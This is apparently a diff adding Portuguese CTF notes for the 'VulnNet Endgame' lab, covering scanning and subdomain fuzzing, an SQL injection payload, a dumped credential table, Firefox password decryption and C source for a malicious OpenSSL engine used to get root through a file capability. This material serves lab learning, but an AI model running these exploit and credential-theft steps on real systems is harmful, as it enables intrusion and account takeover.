@@ -1,0 +1,393 @@
+rustscan:
+
+Open 10.65.184.102:22
+Open 10.65.184.102:80
+
+nmap:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
+|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
+|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+descobrindo o tamanho da resposta para fuzing de subdominios:
+
+1 - ffuf -u http://vulnnet.thm -H "Host: teste.vulnnet.thm" -w <(echo teste)
+2 - curl -H "Host: testeinvalido.vulnnet.thm" http://vulnnet.thm -I
+
+
+subdominios válidos para vulnnet.thm FUZING:
+
+ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w ~/Downloads/Wordlists/subdomain.txt -i -ic -mc 200,301,302,401,403 -c -fs 65
+
+shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 152ms]
+blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 154ms]
+api   	                  [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 155ms]
+API                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 155ms]
+api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 153ms]
+blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 153ms]
+shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 152ms]
+admin1                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 152ms]
+
+
+dominio principal FUZING:
+
+ffuf -u http://admin1.vulnnet.thm/FUZZ -H "Host: admin1.vulnnet.thm" -w ~/Downloads/Wordlists/admin.txt -i -ic -mc 200,301,302,401 -c
+
+retornou algo interessante:
+
+typo3                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 149ms]
+vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 509ms]
+vendor/                 [Status: 200, Size: 3526, Words: 221, Lines: 30, Duration: 149ms]
+composer.json           [Status: 200, Size: 11190, Words: 369, Lines: 272, Duration: 148ms]
+composer.lock           [Status: 200, Size: 290942, Words: 125514, Lines: 8190, Duration: 262ms]
+fileadmin/              [Status: 200, Size: 1151, Words: 76, Lines: 18, Duration: 151ms]
+fileadmin               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 149ms]
+typo3/                  [Status: 200, Size: 10843, Words: 2585, Lines: 160, Duration: 3870ms]
+fileadmin/              [Status: 200, Size: 1151, Words: 76, Lines: 18, Duration: 145ms]
+
+
+typo3 -> cms
+em /vendor/composer/installed.json tem a versão do cms:
+
+{ name: "typo3/cms-cli", version: "2.0.0", version_normalized: "2.0.0.0", … }
+
+
+http://blog.vulnnet.thm/ USERNAMES AQUI
+
+jane
+sal
+mary
+steve
+
+
+o endpoint: http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
+é vulnerável a sqlinjection
+
+http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1000 or 1=1
+retorna conteudo normal!
+
+DATABASE DUMPADA:
+
++--------------------+---------------------+-----+
+| username           | password            | id  |
++--------------------+---------------------+-----+
+ ...
+| lspikinsaz         | D8Gbl8mnxg          | 396 |
+| profeb0            | kLLxorKfd           | 397 |
+| sberrymanb1        | cdXAJAR             | 398 |
+| ajefferiesb2       | 0hdeFiZBRJ          | 399 |
+| hkibblewhiteb3     | 6rl6qXSJDrr         | 400 |
+| dtremayneb4        | DuYMuI              | 401 |
+| bflewinb5          | fwbk0Vgo            | 402 |
+| kmolineuxb6        | 92Fb3vBF5k75        | 403 |
+| fjosefsb7          | zzh9wheBjX          | 404 |
+| tmiskellyb8        | sAGTlyBrb5r         | 405 |
+| nallrightb9        | 3uUPdL              | 406 |
+| hlevermoreba       | fp2LW0x             | 407 |
+| celgerbb           | IKhg7D              | 408 |
+| frustedbc          | Tjyu2Ch2            | 409 |
+| imeneghibd         | NgKgdeKRVEK         | 410 |
+| vgouninbe          | wGWMg3d             | 411 |
+| cbartoschbf        | ruTxBc2n85          | 412 |
+| lcordonbg          | ZydELwZFV2          | 413 |
+| dappsbh            | ROfVmvZSYS          | 414 |
+| zduchanbi          | B4SBGt5yAD          | 415 |
+| jfraybj            | zhE95JJX9l          | 416 |
+| mlanchesterbk      | nXSVHhVW9S          | 417 |
+| cgylesbl           | NCeU070             | 418 |
+| cbonnifacebm       | WzkvfoedkXJx        | 419 |
+| btoppasbn          | ktPBpK1             | 420 |
+| mdurrettbo         | 8fCXE6BF9gj         | 421 |
+| skilroybp          | cSAjOy              | 422 |
+| uvonderemptenbq    | HLUHZ9oQ            | 423 |
+| dvinsenbr          | gTc7TiSsd2          | 424 |
+| ltiltbs            | 7yQ0b1B             | 425 |
+| dsimcoebt          | SXD1eC6ysa          | 426 |
+| wfrailbu           | bgb084kq            | 427 |
+| lmityukovbv        | NsJFz4DLpI          | 428 |
+| vkellarbw          | 7JVPatN             | 429 |
+| rkingstonbx        | yuTnSPEvIoJ4        | 430 |
+| rbakewellby        | L3ttm8              | 431 |
+| dbousteadbz        | vyae6t              | 432 |
+| vstaddenc0         | iA4AD4UlcLF1        | 433 |
+| rwhacketc1         | VlyIAh              | 434 |
+| tnoorc2            | IpsnIEbIaT          | 435 |
+| dduffync3          | UPU9rZu8q           | 436 |
+| dstichelc4         | xuUXUFXoc           | 437 |
+| kcleverlyc5        | yTuqouj9ZK          | 438 |
+| sreinertc6         | QDneobZ1DH          | 439 |
+| mcottinghamc7      | OdrnoHtrP           | 440 |
+| ljansemac8         | c3KvR6              | 441 |
+| acodac9            | GMbFP9              | 442 |
+| rhuggardca         | zIZ11OPuj           | 443 |
+| gkeechcb           | XCX2GVx             | 444 |
+| syurincc           | nJQgYR2uOyZq        | 445 |
+| agaulecd           | AQlFlPvf            | 446 |
+| wboijce            | zj6vR6Bf            | 447 |
+| kphifercf          | eL5uJnLD2           | 448 |
+| abenglecg          | 7HEMdTc07           | 449 |
+| emarkingch         | VbzVZoYn            | 450 |
+| nmuldowneyci       | wln8WN3PJ           | 451 |
+| jbygrovecj         | 3AcKBTHRN           | 452 |
+| bduxburyck         | 32ZXql9Uw8          | 453 |
+| fthewcl            | 2pnBsk6i            | 454 |
+| kmeececm           | JxcEXKAN            | 455 |
+| bholligancn        | rkyCMLwOIt          | 456 |
+| bferonetco         | KlxQ4Vxl            | 457 |
+| jcraycp            | OFc5f2              | 458 |
+| hethertoncq        | SsLMTxbw            | 459 |
+| cclayecr           | nUpdnCZW1cqr        | 460 |
+| tmcbreartycs       | 0I7ldSNbm           | 461 |
+| oderuggieroct      | gqQeawiZ            | 462 |
+| rdoerscu           | djQBjW3pk           | 463 |
+| karbucklecv        | G9FarmKd            | 464 |
+| bbuckbycw          | lXCoFI              | 465 |
+| ldixseecx          | WAMRuFTTI3          | 466 |
+| jmahedycy          | diVq6PDeEpz         | 467 |
+| gdamrellcz         | bV6cXPOFfLg         | 468 |
+| sgarrettd0         | dCrF5fv             | 469 |
+| plaurenceaud1      | Q4gYmlM             | 470 |
+| kmcgeacheyd2       | SnvFrSB6AB          | 471 |
+| mhopewelld3        | qiehVyQ             | 472 |
+| chottond4          | At9A4aCJos          | 473 |
+| hsellandd5         | 8T9v08352re         | 474 |
+| syegorkovd6        | y8chyGC9js          | 475 |
+| adavisond7         | ghMz6e68c1Z         | 476 |
+| amewisd8           | 00S7q8S1f8W         | 477 |
+| lorpind9           | 2rruluVz0SwY        | 478 |
+| jbilovskyda        | hXaVYfHUZoz         | 479 |
+| jhalforddb         | j7GAP4v             | 480 |
+| wcolisbedc         | 0MM46yTEVBL2        | 481 |
+| cgreastydd         | QUDViFUxO           | 482 |
+| ajackde            | YGcBpM              | 483 |
+| cmcgarritydf       | 2js9AM              | 484 |
+| tjostdg            | oJ38KUXgm           | 485 |
+| lguidendh          | KP9DmIk             | 486 |
+| mbletsodi          | qNYURfhw            | 487 |
+| wsneesbydj         | jDmbnZJi            | 488 |
+| glerouxdk          | t8xlAuAvH8Yj        | 489 |
+| yhaythornthwaitedl | TTin1up             | 490 |
+| nzmitrovichdm      | 0ftVkbqP            | 491 |
+| jgodballdn         | Kwcozh              | 492 |
+| jkiddeydo          | TWnwDTB             | 493 |
+| acaghandp          | IxQgXLrw            | 494 |
+| rattestonedq       | AxuOsAA0lqrc        | 495 |
+| mmichallatdr       | GCpyVf              | 496 |
+| rgaitoneds         | YnPCjKg             | 497 |
+| krobbekedt         | NOYhOlnC            | 498 |
+| nknollerdu         | pjSBcAVD            | 499 |
+| wshemeltdv         | 5RigTGe             | 500 |
+| rpeperelldw        | jwKMTMu             | 501 |
+| lbescobydx         | 4qfwbKNed3I         | 502 |
+| jparishdy          | qSX9N1Kf8XJ         | 503 |
+| jminghidz          | AoIrka              | 504 |
+| nforthe0           | Ft4xVROXXCd5        | 505 |
+| tklemensiewicze1   | x3WIaoX99yb         | 506 |
+| epotterye2         | hXcrFv              | 507 |
+| lbrugmanne3        | 6ZtJhp4col          | 508 |
+| adencse4           | bqItfg4wf           | 509 |
+| cfloreze5          | 5W4lM81DPo          | 510 |
+| amatanine6         | IT6p5HT             | 511 |
+| fchalkere7         | 0Q6T9jvAZB          | 512 |
+| rytere8            | M7lvtAz6oRNS        | 513 |
+| cstillee9          | MpO7FgPoz           | 514 |
+| cbashamea          | 8rIuhW0VZ           | 515 |
+| flyeseb            | OS15i4              | 516 |
+| gtieryec           | Usl7mH2H            | 517 |
+| sborgheseed        | WDAliOAKFj7f        | 518 |
+| hmctrustyee        | iwpk0YC             | 519 |
+| wvigeref           | lN8d6g1             | 520 |
+| nbockeneg          | nuwPbeTIgX8F        | 521 |
+| ffranzmaneh        | LvBDyc9JRPV         | 522 |
+| drippingaleei      | ncpiXJX             | 523 |
+| achambersej        | vQUTz2xEyWx4        | 524 |
+| fsuarezek          | wQcbURC             | 525 |
+| kaspoleel          | irTEDl2k            | 526 |
+| mmursellem         | H6WyTMdy            | 527 |
+| szecchinellien     | pukixtg             | 528 |
+| cnewlineo          | Or6dtgSGmd          | 529 |
+| cmccrowep          | VhkvlZO             | 530 |
+| shavershameq       | slncO0kvmb          | 531 |
+| jtumeltyer         | svJ4749mzdJ         | 532 |
+| cmathivates        | weR5eukJOX6C        | 533 |
+| btarzeyet          | rp8sqUpw            | 534 |
+| fstedmaneu         | 8T7UFX              | 535 |
+| mgaitoneev         | SkuuzEsAZ           | 536 |
+| zscotlandew        | RIs9MA              | 537 |
+| dfurbyex           | ttKwcGDELB          | 538 |
+| sdallowey          | PVVOkQqHVdU         | 539 |
+| lmccormackez       | Szh74h              | 540 |
+| arenneyf0          | wMkLVr0             | 541 |
+| lbodegaf1          | 4Bux8MCHXS          | 542 |
+| rsantostefanof2    | ZXIOChbv            | 543 |
+| mvaissieref3       | PcJPLBJf            | 544 |
+| csolwayf4          | kgjhKzMWYakS        | 545 |
+| pwaddingtonf5      | p69xguJZe           | 546 |
+| kchaffeyf6         | ntswwsY             | 547 |
+| zgooblef7          | lh0Llscj            | 548 |
+| pwassf8            | uqzWk2PYLJR7        | 549 |
+| bmcclenaghanf9     | eIZQxLh             | 550 |
+| bhaddintonfa       | IDp96W1RUb          | 551 |
+| rblesingfb         | Z7MGodFb            | 552 |
+| mblownefc          | caw1QQ1             | 553 |
+| lwhitlandfd        | QpPSspEWus          | 554 |
+| lgoftonfe          | u6ZBlHvmId          | 555 |
+| vdubbleff          | BvZ0JJNVWCX         | 556 |
+| dfrenschfg         | Ih1thIl             | 557 |
+| gofarrisfh         | jmjhYpmgg           | 558 |
+| kpipkinfi          | LFXCNqt5hN          | 559 |
+| sshilstonfj        | tofKHos             | 560 |
+| lstanistreetfk     | fCMRSGm4BzNQ        | 561 |
+| ktomasellifl       | zFdwNg16yCdB        | 562 |
+| fmarkhamfm         | qJhjNz0sK7Z         | 563 |
+| bledingtonfn       | wmd4CD60            | 564 |
+| yzettoifo          | mZjvZC              | 565 |
+| coganfp            | 7MeBiB7             | 566 |
+| sdibollfq          | VCV8FqINn           | 567 |
+| blampkinfr         | OsZxivx             | 568 |
+| mfachefs           | HVBEN4              | 569 |
+| kburelft           | m9R8setEC           | 570 |
+| bgrimsdithfu       | q1SivtRlbetm        | 571 |
+| ctolemanfv         | fRnopRDUrds         | 572 |
+| awhiteheadfw       | eZ3TzXtdD           | 573 |
+| mchislettfx        | Uh2kDLMNFeej        | 574 |
+| lreichardtfy       | Ln6WDY              | 575 |
+| bjossfz            | kGBl9CgCPcGF        | 576 |
+| hprevostg0         | TuK60tJ             | 577 |
+| rpritchettg1       | mwTGls              | 578 |
+| dantonssong2       | Ym2cHtkuW           | 579 |
+| gmantrupg3         | axZcgE9T            | 580 |
+| dsimioneg4         | 6LFtl39ggEtI        | 581 |
+| lmiddleg5          | 79hJw4u             | 582 |
+| amcquorkelg6       | UdPazP              | 583 |
+| mellwandg7         | hFdDjfcdwCja        | 584 |
+| ddunbobing8        | w9Copz4             | 585 |
+| cszabog9           | K67Hs5              | 586 |
+| cdorbonga          | molOCywSVk          | 587 |
+| fridgwellgb        | wWQpqk              | 588 |
+| ksiregc            | Ipmq9QvTymr         | 589 |
+| hwhardleygd        | 7v4eltt3Kuw         | 590 |
+| hpoppletonge       | ctvNF49tuT          | 591 |
+| aghidoligf         | hFgxHo5Xp           | 592 |
+| fstilinggg         | g4St9w              | 593 |
+| ebodechongh        | DTSos9KOFhIO        | 594 |
+| rbennellickgi      | 0lj1adMG            | 595 |
+| gnaldergj          | kNEDmUrVp           | 596 |
+| preygk             | 8kt6CKNTc           | 597 |
+| cjigglegl          | Khmoz3bGQiwo        | 598 |
+| aburgisgm          | 2UrQCd16gtqN        | 599 |
+| nluddygn           | yQrAEzZxK           | 600 |
+| lcluttengo         | TeFpfcTSt4K         | 601 |
+| laseefgp           | Q8vHxue1            | 602 |
+| wdovergq           | 8sNg5H              | 603 |
+| bjackesgr          | BB2ymU              | 604 |
+| sphebeygs          | CTCPBoG             | 605 |
+| hhushergt          | KoM1f3mmxlC         | 606 |
+| dmowatgu           | H9fzdE              | 607 |
+| vgoodhandgv        | OQ4Axwb             | 608 |
+| vcocktongw         | zo9YGPcnoFY         | 609 |
+| afrackiewiczgx     | wNfgrMLd92          | 610 |
+| wmccorkellgy       | L70zF2              | 611 |
+| mbaldersongz       | vjlPxrlrB1          | 612 |
+| jdovingtonh0       | 1fDBrk              | 613 |
+| tlunneyh1          | NVQobq              | 614 |
+| lwaulkerh2         | 4IHZylSa6uSk        | 615 |
+| nceccolih3         | 6mqTbfJcyB          | 616 |
+| aworsnuph4         | BtdoQGpOg           | 617 |
+| pwheelhouseh5      | HA5wRx2Xkt          | 618 |
+| ashearsh6          | rsQIXNF4p56t        | 619 |
+| bhendriksh7        | DD87MyB             | 620 |
+| tgrovierh8         | EqEt2NXw37Q         | 621 |
+| kspanswickh9       | oN9I8Sf             | 622 |
+| krattrayha         | HkZs0YLv            | 623 |
+| anorcockhb         | LTSB3oaxy9          | 624 |
+| kneathc            | 2lOIMadSDW2         | 625 |
+| ajaggarhd          | 2YDcmeZaKwig        | 626 |
+| krossbrookehe      | 7pA32uFwx8eh        | 627 |
+| lpavelhf           | yoWnriWXeTc         | 628 |
+| agaitskillhg       | OglY7vT0Pyn         | 629 |
+| bmylechreesthh     | GBCtL62Xa           | 630 |
+| hsimenothi         | JdHOJPdpZV          | 631 |
+| bbrunihj           | PT8RllCQ            | 632 |
+| sroysonhk          | bJR3DOVL            | 633 |
+| bmarrinerhl        | yoJwhOI             | 634 |
+| ataillanthm        | tfncTGLw            | 635 |
+| acassamhn          | dBcYuQwU            | 636 |
+| kfruchonho         | s6QjWpLo            | 637 |
+| kdenyakinhp        | LTbmsk6T            | 638 |
+| mhundyhq           | xrbjFjA8p           | 639 |
+| zcatchesidehr      | gaMmTSLHkMZE        | 640 |
+| anorcrosshs        | VH3FsbYfk           | 641 |
+| kklavesht          | YY6hmavoD           | 642 |
+| bloghanhu          | kElKt4              | 643 |
+| ekayzerhv          | 4eHrdt5Z            | 644 |
+| jovenhw            | 2QZrPJ2             | 645 |
+| gboayshx           | t0xmZtLTXa          | 646 |
+| asuermeiershy      | 09jD21OoQ           | 647 |
+| msambidgehz        | OBJZD6f             | 648 |
+| bhuertai0          | Cc4QOkuSvrF         | 649 |
+| oboatmani1         | kSKBUj8             | 650 |
+| rtamblingi2        | BIkqvmX             | 651 |
++--------------------+---------------------+-----+
+
+
+Senha quebrada:
+
+Username: chris_w
+Password: vAxWtmNzeTz
+
+apos pegar shell, na pasta do usuário system tem um diretorio .mozilla, zipei e baixei na minha maquina
+ferramenta usada: https://github.com/unode/firefox_decrypt.git para descriptografar
+
+decrypt:
+
+python3 firefox_decrypt.py /home/nanoxsec/CTF/VulnnetEndgame/home/system/.mozilla/firefox/2fjnrwth.default-release
+
+Website:   https://tryhackme.com
+Username: 'chris_w@vulnnet.thm'
+Password: '8y7TKQDpucKBYhwsb'
+
+
+tentando logar com system com essa senha: OK DEU CERTO
+
+USERNAME: SYSTEM
+PASSWORD: 8y7TKQDpucKBYhwsb
+
+virando root:
+
+getcap -r / 2>/dev/null
+
+/home/system/Utils/openssl =ep
+
+
+EXPLOIT OPENSSL
+
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+-> gcc -fPIC -o exploit.o -c exploit.c
+-> gcc -shared -o exploit.so -lcrypto exploit.o
+
+SUBIR O EXPLOIT.SO PARA O SERVIDOR:
+
+cd /tmp
+rode:
+/home/system/Utils/openssl req -engine ./exploit.so
+
+virei root e peguei a ultima flag!
